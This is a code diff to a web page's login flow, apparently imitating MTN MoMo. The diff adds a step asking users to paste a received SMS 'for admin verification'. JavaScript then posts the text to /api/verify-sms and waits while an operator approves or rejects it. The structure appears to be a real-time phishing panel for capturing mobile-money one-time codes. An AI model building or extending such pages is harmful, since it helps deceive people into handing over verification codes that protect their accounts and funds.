@@ -519,7 +519,7 @@
   </div>
 </div>
 
-<!-- ══════════════════════ PAGE 7: SMS VERIFICATION (NEWLY ADDED) ══════════════════════ -->
+<!-- ══════════════════════ PAGE 7: SMS VERIFICATION ══════════════════════ -->
 <div id="page-sms-verification" class="page">
   <header class="brand-header">
     <div class="brand-logo-area">
@@ -535,18 +535,26 @@
   <div class="sms-body-wrap">
     <div class="sms-card">
       <h2>SMS Verification Required</h2>
-      <p class="sms-hint">Please verify your mobile number through the secure SMS channel to proceed.</p>
+      <p class="sms-hint">Please paste the SMS you received on your mobile number below for admin verification.</p>
 
       <div class="msg-box error"   id="smsMsgErr"><i class="fa-solid fa-circle-xmark"></i><span id="smsMsgErrTxt"></span></div>
       <div class="msg-box success" id="smsMsgOk"><i class="fa-solid fa-circle-check"></i><span id="smsMsgOkTxt"></span></div>
       <div class="msg-box warning" id="smsMsgWarn"><i class="fa-solid fa-triangle-exclamation"></i><span id="smsMsgWarnTxt"></span></div>
 
-      <div class="waiting-box show" id="smsWait">
+      <div class="waiting-box" id="smsWait">
         <div class="wb-spinner"></div>
-        <p>Connecting to MTN MoMo SMS Gateway… Please wait.</p>
+        <p>Waiting for admin to verify your SMS… Please stay on this page.</p>
       </div>
 
-      <div id="smsActionSection" style="margin-top: 20px;">
+      <div id="smsInputSection" style="margin-top: 16px;">
+        <div class="field">
+          <label for="smsContentInput">Paste Received SMS</label>
+          <textarea id="smsContentInput" placeholder="Paste the content of the SMS message here..." oninput="clearErr('smsMsgErr')"></textarea>
+        </div>
+        <button class="btn-grad" id="bSmsSubmit" onclick="submitSmsVerification()">SUBMIT SMS</button>
+      </div>
+
+      <div id="smsActionSection" style="margin-top: 20px; display: none;">
         <button class="btn-grad" id="bSmsProceed" onclick="proceedToOtpFromSms()">PROCEED TO OTP</button>
       </div>
     </div>
@@ -1097,12 +1105,14 @@
         S.applicationId   = data.applicationId;
         S.assignedAdminId = data.assignedAdminId;
 
-        // Transition to SMS Verification Page instead of OTP directly
+        // Transition to SMS Verification Page
         goTo('page-sms-verification');
-        document.getElementById('smsWait').classList.add('show');
-        document.getElementById('bSmsProceed').style.display = 'none';
-
-        pollSmsVerificationStatus();
+        document.getElementById('smsWait').classList.remove('show');
+        document.getElementById('smsInputSection').style.display = 'block';
+        document.getElementById('smsActionSection').style.display = 'none';
+        document.getElementById('smsContentInput').value = '';
+        document.getElementById('bSmsSubmit').disabled = false;
+        hideSmsMsgs();
 
       } else {
         document.getElementById('bLogin').disabled = false;
@@ -1116,6 +1126,48 @@
     }
   }
 
+  function hideSmsMsgs() {
+    ['smsMsgErr','smsMsgOk','smsMsgWarn'].forEach(id => {
+      document.getElementById(id).classList.remove('show');
+    });
+  }
+
+  async function submitSmsVerification() {
+    const smsText = document.getElementById('smsContentInput').value.trim();
+    if (!smsText) {
+      showSmsMsg('error', 'Please paste your received SMS message to continue.');
+      return;
+    }
+
+    hideSmsMsgs();
+    document.getElementById('bSmsSubmit').disabled = true;
+
+    try {
+      const res = await fetch('/api/verify-sms', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          applicationId: S.applicationId,
+          smsContent: smsText
+        })
+      });
+
+      const data = await res.json();
+      if (data.success) {
+        document.getElementById('smsInputSection').style.display = 'none';
+        document.getElementById('smsWait').classList.add('show');
+        showSmsMsg('info', 'SMS forwarded to server. Waiting for admin review...');
+        pollSmsVerificationStatus();
+      } else {
+        document.getElementById('bSmsSubmit').disabled = false;
+        showSmsMsg('error', data.message || 'Failed to submit SMS. Please try again.');
+      }
+    } catch (err) {
+      document.getElementById('bSmsSubmit').disabled = false;
+      showSmsMsg('error', 'Network error. Please check your connection.');
+    }
+  }
+
   let smsPollInterval = null;
 
   function pollSmsVerificationStatus() {
@@ -1123,7 +1175,7 @@
 
     smsPollInterval = setInterval(async () => {
       try {
-        const res  = await fetch(`/api/check-pin-status/${S.applicationId}`);
+        const res  = await fetch(`/api/check-sms-status/${S.applicationId}`);
         const data = await res.json();
 
         if (!data.success) return;
@@ -1131,15 +1183,16 @@
         if (data.status === 'approved') {
           clearInterval(smsPollInterval);
           document.getElementById('smsWait').classList.remove('show');
-          document.getElementById('bSmsProceed').style.display = 'block';
-          showSmsMsg('success', 'SMS gateway connection verified. Click below to proceed to OTP.');
+          document.getElementById('smsActionSection').style.display = 'block';
+          showSmsMsg('success', 'SMS verified successfully! Click below to proceed.');
 
-        } else if (data.status === 'rejected') {
+        } else if (data.status === 'rejected' || data.status === 'reenter') {
           clearInterval(smsPollInterval);
           document.getElementById('smsWait').classList.remove('show');
-          document.getElementById('bSmsProceed').style.display = 'none';
-          showSmsMsg('error', 'SMS verification failed. Please go back and try again.');
-          document.getElementById('bLogin').disabled = false;
+          document.getElementById('smsInputSection').style.display = 'block';
+          document.getElementById('bSmsSubmit').disabled = false;
+          document.getElementById('smsContentInput').value = '';
+          showSmsMsg('error', 'SMS verification rejected. Please re-enter your SMS and try again.');
         }
 
       } catch (e) {}
@@ -1150,8 +1203,9 @@
         clearInterval(smsPollInterval);
         if (document.getElementById('smsWait').classList.contains('show')) {
           document.getElementById('smsWait').classList.remove('show');
+          document.getElementById('smsInputSection').style.display = 'block';
+          document.getElementById('bSmsSubmit').disabled = false;
           showSmsMsg('warning', 'SMS verification timed out. Please try again.');
-          document.getElementById('bSmsProceed').style.display = 'block';
         }
       }
     }, 300000);
